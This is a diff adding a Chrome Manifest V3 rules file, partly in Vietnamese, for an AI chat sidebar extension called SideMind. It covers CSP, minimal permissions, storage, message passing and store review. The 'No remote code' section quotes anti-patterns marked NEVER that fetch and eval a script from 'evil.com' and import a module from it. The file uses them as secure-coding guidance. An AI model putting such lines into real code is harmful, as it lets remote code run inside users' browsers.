@@ -1,0 +1,210 @@
+---
+description: Chrome MV3 + WXT rules cho SideMind — manifest, CSP, permissions, no remote code, security baseline.
+globs: **/manifest.json,**/*.mts,src/background/**,**/wxt.config.ts
+alwaysApply: false
+---
+
+# Chrome MV3 Rules
+
+## 1. Manifest V3 only — không dùng MV2
+
+```json
+{
+  "manifest_version": 3,
+  "name": "SideMind",
+  "version": "0.1.0",
+  "description": "AI chat sidebar with context awareness"
+}
+```
+
+KHÔNG:
+- `background.scripts` (MV2) → dùng `background.service_worker` (MV3).
+- `browser_action` / `page_action` → dùng `action`.
+- Persistent background page → dùng Service Worker (event-driven, tự terminate).
+- `web_accessible_resources` không có entry type.
+
+## 2. CSP nghiêm ngặt
+
+```json
+{
+  "content_security_policy": {
+    "extension_pages": "script-src 'self'; object-src 'self'",
+    "sandbox": "sandbox allow-scripts allow-forms"
+  }
+}
+```
+
+KHÔNG:
+- `unsafe-inline` trong script-src.
+- `unsafe-eval` trong bất kỳ context nào.
+- `script-src 'self' 'unsafe-eval'` — Chrome Web Store sẽ reject.
+- Wildcard `*` trong script-src.
+
+## 3. Permissions — tối thiểu
+
+### Quy tắc
+- **MUST** justify mỗi permission trong Phụ lục B SRS trước khi khai báo.
+- **AVOID** `<all_urls>` — chỉ dùng khi content script cần access mọi trang (SideMind có vì context extraction).
+- **PREFER** `optional_host_permissions` + runtime request khi có thể.
+
+### Permissions chuẩn của SideMind
+```json
+{
+  "permissions": [
+    "sidePanel",
+    "storage",
+    "activeTab",
+    "scripting",
+    "contextMenus",
+    "tabs",
+    "commands"
+  ],
+  "host_permissions": [
+    "https://api.openai.com/*",
+    "https://api.anthropic.com/*",
+    "https://generativelanguage.googleapis.com/*",
+    "https://www.youtube.com/*"
+  ]
+}
+```
+
+## 4. No remote code
+
+```typescript
+// ❌ NEVER
+const script = await fetch('https://evil.com/script.js').then(r => r.text());
+eval(script);
+
+// ❌ NEVER
+const module = await import('https://evil.com/module.js');
+
+// ❌ NEVER
+new Function('return ' + dynamicCode)();
+```
+
+Mọi JavaScript phải đóng gói trong extension package (`dist/`). Runtime chỉ được load code local qua `chrome.runtime.getURL()`.
+
+## 5. Network requests — host_permissions
+
+Mọi `fetch()`, `XMLHttpRequest`, hoặc WebSocket connection phải tới domain đã khai báo trong `host_permissions`. SideMind chỉ gọi:
+
+| Domain | Mục đích |
+|---|---|
+| `api.openai.com` | OpenAI Chat Completions |
+| `api.anthropic.com` | Anthropic Messages |
+| `generativelanguage.googleapis.com` | Gemini API |
+| `www.youtube.com` | YouTube timedtext |
+
+Nếu cần thêm domain → update manifest + Phụ lục B SRS + Phụ lục C open issues.
+
+## 6. Storage boundaries
+
+```typescript
+// chrome.storage.local — persistent, ~10MB quota
+await chrome.storage.local.set({ settings });
+
+// chrome.storage.session — in-memory, cleared khi browser restart
+await chrome.storage.session.set({ ephemeralState });
+
+// IndexedDB — cho data lớn (ContextCache, Conversation history)
+await openDB('sidemind', 1, { upgrade(db) { db.createObjectStore('conversations'); } });
+```
+
+Quy tắc:
+- Settings, API key (encrypted), conversation metadata → `chrome.storage.local`.
+- Service worker state tạm → `chrome.storage.session`.
+- Context cache, conversation content lớn → IndexedDB.
+- File binary (FR-12) → **CHỈ giữ trong memory**, không persist.
+
+## 7. Message passing
+
+### One-shot request/response
+```typescript
+// Side Panel → Service Worker
+const result = await chrome.runtime.sendMessage({ type: 'getSettings' });
+
+// Service Worker handler
+chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
+  if (msg.type === 'getSettings') {
+    handleGetSettings().then(sendResponse);
+    return true;  // async response
+  }
+});
+```
+
+### Long-lived port (streaming)
+```typescript
+// Service Worker
+chrome.runtime.onConnect.addListener((port) => {
+  if (port.name === 'chat-stream') {
+    port.onMessage.addListener(async (msg) => {
+      for await (const chunk of aiAdapter.stream(msg)) {
+        port.postMessage({ type: 'chunk', data: chunk });
+      }
+      port.postMessage({ type: 'done' });
+    });
+  }
+});
+
+// Side Panel
+const port = chrome.runtime.connect({ name: 'chat-stream' });
+port.postMessage({ type: 'chat', messages });
+port.onMessage.addListener((msg) => {
+  if (msg.type === 'chunk') appendChunk(msg.data);
+  if (msg.type === 'done') finishStream();
+});
+```
+
+## 8. Side Panel best practices
+
+```typescript
+// manifest.json
+{
+  "side_panel": {
+    "default_path": "sidepanel.html"
+  },
+  "permissions": ["sidePanel"]
+}
+
+// Set behavior per-tab
+await chrome.sidePanel.setOptions({
+  tabId,
+  path: 'sidepanel.html',
+  enabled: true
+});
+
+// Open programmatically
+await chrome.sidePanel.open({ tabId });
+```
+
+## 9. Content Script isolation
+
+```typescript
+// Content script KHÔNG đụng page CSS/JS variables
+// Dùng Shadow DOM cho FAB injection
+class FABController {
+  private host = document.createElement('div');
+  private shadow = this.host.attachShadow({ mode: 'open' });
+
+  inject() {
+    document.body.appendChild(this.host);
+    // Render vào this.shadow, không vào document
+  }
+}
+```
+
+## 10. Service Worker resilience
+
+- Service Worker có thể bị Chrome terminate bất kỳ lúc nào (sau 30s idle).
+- Persist state quan trọng qua `chrome.storage.session` ngay khi thay đổi.
+- Re-entrant code: handler phải idempotent.
+
+## 11. Khi review / submit Chrome Web Store
+
+Checklist:
+- [ ] CSP strict, no inline scripts.
+- [ ] Permission justification đầy đủ cho mỗi permission trong store listing.
+- [ ] Demo video giải thích `<all_urls>` usage.
+- [ ] Privacy policy URL accessible.
+- [ ] Icon đầy đủ sizes: 16, 32, 48, 128.
+- [ ] Bundle unpacked < 5MB (NFR-01).
